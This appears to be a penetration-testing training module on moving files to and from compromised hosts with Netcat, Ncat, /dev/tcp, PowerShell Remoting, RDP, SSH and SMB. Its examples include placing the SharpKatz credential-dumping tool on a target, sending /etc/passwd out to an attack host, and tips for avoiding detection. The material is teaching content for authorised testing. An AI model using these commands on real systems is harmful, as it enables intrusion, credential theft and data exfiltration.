# Miscellaneous File Transfer Methods

## Introduction

We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.

This section covers alternative methods such as transferring files using Netcat, Ncat and using RDP and PowerShell sessions.

## Netcat

Netcat (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

**⚠️ Note:** Ncat is used in HackTheBox's PwnBox as `nc`, `ncat`, and `netcat`.

### File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.

#### Method 1: Target as Listener

**NetCat - Compromised Machine - Listening on Port 8000:**
```bash
# Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

**Ncat - Compromised Machine - Listening on Port 8000:**
```bash
# Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

**⚠️ Note:** If the compromised machine is using Ncat, we need to specify `--recv-only` to close the connection once the file transfer is finished.

**Netcat - Attack Host - Sending File to Compromised machine:**
```bash
# Download the file first
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

# Example using Original Netcat
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Ncat - Attack Host - Sending File to Compromised machine:**
```bash
# Download the file first
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

# Example using Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

**⚠️ Note:** The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.

#### Method 2: Attack Host as Listener

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.

**Attack Host - Sending File as Input to Netcat:**
```bash
# Example using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Compromised Machine Connect to Netcat to Receive the File:**
```bash
# Example using Original Netcat
nc 192.168.49.128 443 > SharpKatz.exe
```

**Attack Host - Sending File as Input to Ncat:**
```bash
# Example using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connect to Ncat to Receive the File:**
```bash
# Example using Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

### Using /dev/tcp (Bash Alternative)

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file `/dev/TCP/`.

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

**Attack Host - Setup Listener:**
```bash
# Using Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# OR using Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File:**
```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**⚠️ Note:** The same operation can be used to transfer files from the compromised host to our attack machine.

### Netcat File Transfer Examples

#### Upload from Target to Attack Host

**Attack Host - Listen for incoming file:**
```bash
nc -l -p 8000 > received_file.txt
```

**Target Machine - Send file:**
```bash
nc 192.168.49.128 8000 < /etc/passwd
```

#### Encrypted Transfer with Ncat

**Attack Host - SSL listener:**
```bash
ncat -l -p 8000 --ssl --recv-only > received_file.txt
```

**Target Machine - SSL client:**
```bash
ncat 192.168.49.128 8000 --ssl --send-only < /etc/passwd
```

#### Netcat with Compression

**Sender:**
```bash
tar czf - /path/to/directory | nc 192.168.49.128 8000
```

**Receiver:**
```bash
nc -l -p 8000 | tar xzf -
```

## PowerShell Session File Transfer

We already talked about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations.

**Default Ports:**
- **HTTP:** TCP/5985
- **HTTPS:** TCP/5986

### Prerequisites

To create a PowerShell Remoting session on a remote computer, we need:
- Administrative access, OR
- Be a member of the Remote Management Users group, OR
- Have explicit permissions for PowerShell Remoting in the session configuration

### PowerShell Remoting Setup

**Check WinRM Connectivity:**
```powershell
# From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

**Create PowerShell Remoting Session:**
```powershell
# Create a session to DATABASE01
$Session = New-PSSession -ComputerName DATABASE01

# With credentials (if needed)
$Credential = Get-Credential
$Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
```

### File Transfer Operations

**Copy file from localhost to remote session:**
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy file from remote session to localhost:**
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

**Copy directory recursively:**
```powershell
Copy-Item -Path C:\LocalFolder -ToSession $Session -Destination C:\RemoteFolder -Recurse
```

**Session Management:**
```powershell
# List active sessions
Get-PSSession

# Remove session when done
Remove-PSSession -Session $Session

# Remove all sessions
Get-PSSession | Remove-PSSession
```

### Advanced PowerShell Remoting

**Execute commands on remote session:**
```powershell
Invoke-Command -Session $Session -ScriptBlock { Get-Process }
```

**Transfer and execute script:**
```powershell
# Copy script to remote machine
Copy-Item -Path C:\Scripts\MyScript.ps1 -ToSession $Session -Destination C:\Temp\

# Execute the script remotely
Invoke-Command -Session $Session -ScriptBlock { & C:\Temp\MyScript.ps1 }
```

**Secure file transfer with HTTPS:**
```powershell
$SessionOption = New-PSSessionOption -UseSSL
$Session = New-PSSession -ComputerName DATABASE01 -SessionOption $SessionOption -Port 5986
```

## RDP (Remote Desktop Protocol)

RDP is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

### Linux RDP Clients

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

#### Method 1: Copy and Paste

**Basic RDP Connection:**
```bash
# Using rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'test123'

# Using xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'test123'
```

#### Method 2: Mount Local Directory

As an alternative to copy and paste, we can mount a local resource on the target RDP server.

**Mounting a Linux Folder Using rdesktop:**
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'test123' -r disk:linux='/home/user/rdesktop/files'
```

**Mounting a Linux Folder Using xfreerdp:**
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'test123' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

**Access the mounted directory:**
- Navigate to `\\tsclient\linux` in Windows Explorer
- This allows transfer of files to and from the RDP session

**⚠️ Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

### Windows Native RDP Client

From Windows, the native `mstsc.exe` remote desktop client can be used.

**Using mstsc.exe:**
1. Open Remote Desktop Connection
2. Go to Local Resources tab
3. Click "More..." under Local devices and resources
4. Select drives to make available
5. Connect to remote system

### Advanced RDP Options

**Enable clipboard sharing:**
```bash
xfreerdp /v:10.10.10.132 /u:administrator /p:'test123' /clipboard
```

**Mount multiple drives:**
```bash
xfreerdp /v:10.10.10.132 /u:administrator /p:'test123' /drive:share1,/tmp /drive:share2,/home/user
```

**RDP with custom resolution:**
```bash
xfreerdp /v:10.10.10.132 /u:administrator /p:'test123' /w:1920 /h:1080 /drive:linux,/tmp
```

## Additional Network Transfer Methods

### Using SSH Tunneling

**Forward local port through SSH:**
```bash
ssh -L 8080:localhost:80 user@target-host
```

**Transfer files through tunnel:**
```bash
# After establishing tunnel
curl http://localhost:8080/file.txt -o file.txt
```

### Using FTP/SFTP

**Basic FTP transfer:**
```bash
ftp target-host
# ftp> binary
# ftp> put localfile.txt
# ftp> get remotefile.txt
```

**SFTP batch operations:**
```bash
echo "put localfile.txt" > sftp_commands.txt
echo "get remotefile.txt" >> sftp_commands.txt
sftp -b sftp_commands.txt user@target-host
```

### Using SMB/CIFS

**Mount SMB share:**
```bash
sudo mount -t cifs //target-host/share /mnt/smb -o username=user,password=test123

# Transfer files
cp file.txt /mnt/smb/
cp /mnt/smb/remote_file.txt .

# Unmount when done
sudo umount /mnt/smb
```

## Security Considerations

### Encryption

**Always prefer encrypted methods:**
- Use HTTPS instead of HTTP
- Use SFTP instead of FTP
- Use SSH tunneling for additional security
- Use Ncat with SSL/TLS

### Network Security

**Firewall considerations:**
- Outbound connections are often less restricted
- Use common ports (80, 443, 53) when possible
- Consider using reverse connections

### Data Integrity

**Verify file transfers:**
```bash
# Generate checksum on source
md5sum file.txt > file.txt.md5

# Verify on destination
md5sum -c file.txt.md5
```

**Check file sizes:**
```bash
# Source
ls -la file.txt

# Destination
ls -la file.txt
```

## Troubleshooting Common Issues

### Netcat Issues

**Connection refused:**
- Check if port is open
- Verify firewall rules
- Try different ports

**Transfer incomplete:**
- Use `-q 0` with original netcat
- Use `--send-only` and `--recv-only` with ncat
- Check file sizes after transfer

### PowerShell Remoting Issues

**Access denied:**
- Verify user permissions
- Check if WinRM is enabled
- Verify Remote Management Users group membership

**Connection timeout:**
- Check network connectivity
- Verify WinRM ports (5985/5986)
- Check Windows Firewall settings

### RDP Issues

**Authentication failed:**
- Verify credentials
- Check domain settings
- Ensure RDP is enabled

**Drive mounting not working:**
- Check RDP client version
- Verify local permissions
- Try different mount paths

## Best Practices

1. **Choose appropriate method** based on environment constraints
2. **Verify file integrity** after transfers
3. **Use encryption** when dealing with sensitive data
4. **Clean up** temporary files and connections
5. **Document methods** that work in specific environments
6. **Test multiple methods** as backup options
7. **Monitor network traffic** to avoid detection
8. **Use legitimate tools** when possible to blend in

## Key Takeaways

1. **Netcat is versatile** - Works for both directions and can bypass firewalls
2. **PowerShell Remoting** - Powerful for Windows environments with WinRM
3. **RDP file sharing** - Convenient for interactive file transfers
4. **Multiple fallback options** - Always have backup methods ready
5. **Security matters** - Use encrypted methods when possible
6. **Firewall considerations** - Understand network restrictions
7. **Verification important** - Always check file integrity
8. **Environment awareness** - Different methods work in different scenarios

## References

- [Netcat Manual](https://nc110.sourceforge.io/)
- [Ncat Guide](https://nmap.org/ncat/guide/)
- [PowerShell Remoting Guide](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)
- [xfreerdp Manual](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface)
- [Windows RDP Documentation](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/)
- [SSH Tunneling Guide](https://www.ssh.com/academy/ssh/tunneling/example) 